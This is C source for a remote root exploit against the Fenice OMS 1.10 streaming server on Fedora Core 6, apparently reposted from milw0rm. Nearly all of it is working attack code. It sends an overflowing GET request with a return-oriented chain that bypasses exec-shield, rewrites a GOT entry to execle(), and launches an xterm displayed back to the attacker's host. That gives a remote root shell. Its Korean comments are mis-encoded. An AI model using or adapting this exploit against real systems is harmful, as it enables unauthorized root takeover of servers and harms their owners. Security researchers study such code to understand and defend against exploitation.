/*
**
** Fedora Core 6 (exec-shield) based
** Fenice OMS server (fenice-1.10.tar.gz) remote root exploit
** by Xpl017Elz
**
** Advanced exploitation in exec-shield (Fedora Core case study)
** URL: http://x82.inetcop.org/h0me/papers/FC_exploit/FC_exploit.txt
**
** Reference: http://www.securityfocus.com/bid/17678
** vendor: http://streaming.polito.it/legacy_server
**
** --
** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>.
** My World: http://x82.inetcop.org
**
*/
/*
** -=-= POINT! POINT! POINT! POINT! POINT! =-=-
**
** This is a very common standalone daemon remote buffer overflow vulnerability.
** I used the method that I used on my proftpd exploit again to avoid random mapping library.
** And I'm plainning to publish it in English.
**
** http://x82.inetcop.org/h0me/papers/FC_exploit/FC_oneshot_exploit.txt
**
** Kaveh Razavi's exploit uses about 750Kb and mine uses 115Kb more.
**
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>


#define UNAME_PLT 0x8048e9c // <uname@plt> // randomÇÏ°Ô mappingµÇ´Â (execle()>>16)&0xff GOT 1byte¸¦ È®º¸ÇÏ±â À§ÇØ

#define STRCPY_PLT 0x08048ffc // <strcpy@plt>
#define MOVE_ESP 0x80569e5 // <__do_global_ctors_aux+37>:   pop    %ebx // retÀ» Æ÷ÇÔ ÃÑ 12byte ÀÌµ¿ (nergal's idea)

#define GETGID_GOT 0x8059234 // execle() ÇÔ¼ö ÁÖ¼Ò¸¦ ÀÓÀÇ·Î Á¶ÇÕÇÏ¿© ³ÖÀ» GOT ÁÖ¼Ò
/*
	(gdb) x/x 0x8059234
	0x8059234 <_GLOBAL_OFFSET_TABLE_+324>:  0x08049222
	(gdb) x 0x08049222
	0x8049222 <getgid@plt+6>:       0x00027068
	(gdb)
*/
#define GETGID_PLT	0x0804921c // <getgid@plt> // GOT Á¶ÇÕ ÀÌÈÄ, PLT¸¦ ÅëÇØ execle() ÇÔ¼ö ÇÚµé¸µ


#define EXECLE_16_0xff	0x8059156 // (execle()>>16)&0xff // uname ÇÔ¼öÀÇ 1byte: 0x!!0000
#define EXECLE_08_0xff	0x80591b5 // (execle()>>8)&0xff // bind ÇÔ¼öÀÇ 1byte: 0x00!!00
#define EXECLE_00_0xff	0x8048e83 // (execle()>>0)&0xff // ³ª¸ÓÁö Á¤ÀûÀÎ 1byte: 0x0000!!


/* Á¤ÀûÀ¸·Î Á¢±Ù °¡´ÉÇÑ ¹öÆÛ°¡ ÀÖÀ» °æ¿ì, ÇÊ¿ä ¾øÀ½ */
#define DATA_LOC 0x805af4c // heap ºó °ø°£À» ÀÌ¿ë


/* /usr/X11R6/bin/xterm */
#define ARG1_LOC	0x805af4c // Á¶ÇÕµÈ ¸í·É ½ÃÀÛ ÁÖ¼Ò (argv[0],argv[1]·Î ¾²ÀÓ)
#define SLASH_STR	0x8055acb // "/"
#define XTERM_STR_1	0x804875d // "us"
#define XTERM_STR_2	0x80585ce // "r/"
#define X_STR_1		0x8048df3 // "X"
#define R_STR		0x804a572 // "R"
#define XTERM_STR_3	0x804882c // "bin"
#define X_STR_2		0x8048e33 // "x"
#define XTERM_STR_4	0x8056a33 // "term"


/* -display */
#define ARG2_LOC	0x805af61 // Á¶ÇÕµÈ ¿É¼Ç ½ÃÀÛ ÁÖ¼Ò (argv[2]·Î ¾²ÀÓ)
#define DISPLAY_OPTION	0x80584b8 // "-di"


/* xhost_ip:0 */
#define ARG3_LOC	0x805af65 // Á¶ÇÕµÈ xhost IP ½ÃÀÛ ÁÖ¼Ò (argv[3]À¸·Î ¾²ÀÓ)
#define NUM_0		0x8053285 // "0"
#define NUM_1		0x804ef17 // "1"
#define NUM_2		0x804b37b // "2"
#define NUM_3		0x804d622 // "3"
#define NUM_4		0x804e583 // "4"
#define NUM_5		0x80554d7 // "5"
#define NUM_6		0x8052341 // "6"
#define NUM_7		0x804d14a // "7"
#define NUM_8		0x8048db3 // "8"
#define NUM_9		0x80516bb // "9"


#define COLON_STR 0x8057abb // ":"
#define NULL_STR 0x805afbe // 0x00000000


int main(int argc,char *argv[]){
	int i=0,j=0;
	struct hostent *se;
	struct sockaddr_in saddr;
	unsigned long ip,ip1,ip2,ip3,ip4;
	unsigned char do_ex[4096];
	unsigned char xhost_ip[256];
	int sock;
	char host[256];
	int port=554;

	memset((char *)do_ex,0,sizeof(do_ex));
	ip=ip1=ip2=ip3=ip4;


	printf("/*\n**\n** Fedora Core 6 (exec-shield) based\n"
		"** Fenice OMS server (fenice-1.10.tar.gz) remote root exploit\n"
		"** by Xpl017Elz\n**\n");
	if(argc<2){
		printf("** Usage: %s [host] [port] [xhost ip]\n",argv[0]);
		printf("**\n** host: Fenice 1.10 Open Media Streaming Server\n");
		printf("** port: default 554\n");
		printf("** xhost ip: attacker xhost\n**\n");
		printf("** Example: %s fenice.omss.co.kr 554 82.82.82.82\n**\n*/\n",argv[0]);
		exit(-1);
	}
	else {
		sscanf(argv[3],"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
#define IP1 16777216
#define IP2 65536
#define IP3 256
		ip=0;
		ip+=ip1 * (IP1);
		ip+=ip2 * (IP2);
		ip+=ip3 * (IP3);
		ip+=ip4;

		memset((char *)xhost_ip,0,256);
		sprintf(xhost_ip,"%10lu",ip);
	}

	memset((char *)host,0,sizeof(host));
	strncpy(host,argv[1],sizeof(host)-1);
	port=atoi(argv[2]);

	se=gethostbyname(host);
	if(se==NULL){
		printf("** gethostbyname() error\n**\n*/\n");
		return -1;
	}
	sock=socket(AF_INET,SOCK_STREAM,0);
	if(sock==-1){
		printf("** socket() error\n**\n*/\n");
		return -1;
	}

	saddr.sin_family=AF_INET;
	saddr.sin_port=htons(port);
	saddr.sin_addr=*((struct in_addr *)se->h_addr);
	bzero(&(saddr.sin_zero),8);


	printf("** make exploit\n");
	sprintf(do_ex,"GET /");
	j=strlen(do_ex);
	for(i=0;i<320;i++,j++){
		sprintf(do_ex+j,"A");
	}

#define __GOGOSSING(dest,index,src){\
	*(long *)&dest[index]=src;\
	index+=4;\
}

	__GOGOSSING(do_ex,j,UNAME_PLT); /* uname GOT °ª Ã¤¿ò */
	// execle() ÁÖ¼Ò Á¶ÇÕ
	{
		i=0;
		/* (execle()>>0)&0xff */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,GETGID_GOT+i++);
		__GOGOSSING(do_ex,j,EXECLE_00_0xff);
		/* (execle()>>8)&0xff */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,GETGID_GOT+i++);
		__GOGOSSING(do_ex,j,EXECLE_08_0xff);
		/* (execle()>>16)&0xff */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,GETGID_GOT+i++);
		__GOGOSSING(do_ex,j,EXECLE_16_0xff);
	}
	// argv[0],argv[1]: /usr/X11R6/bin/xterm
	{
		i=0;
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,SLASH_STR);
		i+=1; /* "/" */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,XTERM_STR_1);
		i+=2; /* "us" */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,XTERM_STR_2);
		i+=2; /* "r/" */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,X_STR_1);
		i+=1; /* "X" */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,NUM_1);
		i+=1; /* "1" */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,NUM_1);
		i+=1; /* "1" */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,R_STR);
		i+=1; /* "R" */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,NUM_6);
		i+=1; /* "6" */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,SLASH_STR);
		i+=1; /* "/" */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,XTERM_STR_3);
		i+=3; /* "bin" */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,SLASH_STR);
		i+=1; /* "/" */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,X_STR_2);
		i+=1; /* "x" */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,XTERM_STR_4);
		i+=4; /* "term" */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,NULL_STR);
		i+=1; /* null */
	}
	// argv[2]: -display
	{
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,DISPLAY_OPTION);
		i+=3; /* "-di" */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,NULL_STR);
		i+=1; /* null */
	}
	// argv[3]: xhost_ip:0
	for(ip=0;ip<10;ip++){
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);

		switch(xhost_ip[ip]){
			case '0':
				__GOGOSSING(do_ex,j,NUM_0);
				break;
			case '1':
				__GOGOSSING(do_ex,j,NUM_1);
				break;
			case '2':
				__GOGOSSING(do_ex,j,NUM_2);
				break;
			case '3':
				__GOGOSSING(do_ex,j,NUM_3);
				break;
			case '4':
				__GOGOSSING(do_ex,j,NUM_4);
				break;
			case '5':
				__GOGOSSING(do_ex,j,NUM_5);
				break;
			case '6':
				__GOGOSSING(do_ex,j,NUM_6);
				break;
			case '7':
				__GOGOSSING(do_ex,j,NUM_7);
				break;
			case '8':
				__GOGOSSING(do_ex,j,NUM_8);
				break;
			case '9':
				__GOGOSSING(do_ex,j,NUM_9);
				break;
		}
		i+=1;
	}
	{
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,COLON_STR);
		i+=1; /* ":" */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,NUM_0);
		i+=1; /* "0" */
		__GOGOSSING(do_ex,j,STRCPY_PLT);
		__GOGOSSING(do_ex,j,MOVE_ESP);
		__GOGOSSING(do_ex,j,DATA_LOC+i);
		__GOGOSSING(do_ex,j,NULL_STR);
		i+=1; /* null */
	}
	// exploit
	{
		__GOGOSSING(do_ex,j,GETGID_PLT); // getgidÀÇ GOT´Â execle() ÇÔ¼ö¸¦ °¡Áö¹Ç·Î, PLT·Î ÇÚµé¸µ °¡´É.
		__GOGOSSING(do_ex,j,0x82828282); // callÀÌ ¾Æ´Ï¹Ç·Î, ÀÌÀü ÇÔ¼ö %eip¸¦ ´ë½ÅÇØ¼­ Ã¤¿ò.
		__GOGOSSING(do_ex,j,ARG1_LOC); /* argv[0] */
		__GOGOSSING(do_ex,j,ARG1_LOC); /* argv[1] */
		__GOGOSSING(do_ex,j,ARG2_LOC); /* argv[2] */
		__GOGOSSING(do_ex,j,ARG3_LOC); /* argv[3] */
	}
	printf("** exploit size: %d\n",strlen(do_ex));

	i=connect(sock,(struct sockaddr *)&saddr,sizeof(struct sockaddr));
	if(i==-1){
		printf("** connect() error\n**\n*/\n");
		return -1;
	}
	else {
		printf("** send exploit\n");
		send(sock,do_ex,j,0);

		printf("** sleepppppppp...\n");
		sleep(1);
		send(sock,"\n",1,0);
		send(sock,"\n",1,0);
	}
	close(sock);

	printf("** xhost, check it up, now!\n**\n*/\n");
	exit(0);
}

/* eoc */

// milw0rm.com [2007-04-29]
